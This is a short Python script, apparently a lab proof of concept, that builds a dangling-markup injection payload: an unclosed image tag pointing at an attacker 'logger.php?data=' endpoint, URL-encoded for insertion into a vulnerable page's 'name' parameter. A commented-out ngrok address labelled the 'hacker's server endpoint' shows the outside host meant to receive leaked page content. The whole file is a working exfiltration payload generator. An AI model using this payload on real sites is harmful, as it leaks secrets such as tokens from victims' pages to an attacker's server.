def encode(s, esc):
    parsed = ""
    for c in s:
        if c in esc:
            parsed += '%' + hex(ord(c))[2:].upper()
        else:
            parsed += c
    return parsed

to_escape = "<> \"\'"

# url of vulnerable page
# base_url = "http://localhost/dangling_markup/?name="
base_url = ""

# hacker's server endpoint
# endpoint = "http://42da-2a01-cb14-a98-8400-32b-c6dd-f698-54eb.ngrok.io/dangling_markup/logger.php?data="
endpoint = "http://localhost/SERE/dangling_markup/poc/logger.php?data="

payload = "<img src=\"" + endpoint
complete_url = base_url + payload

print(complete_url)
print(encode(complete_url, to_escape))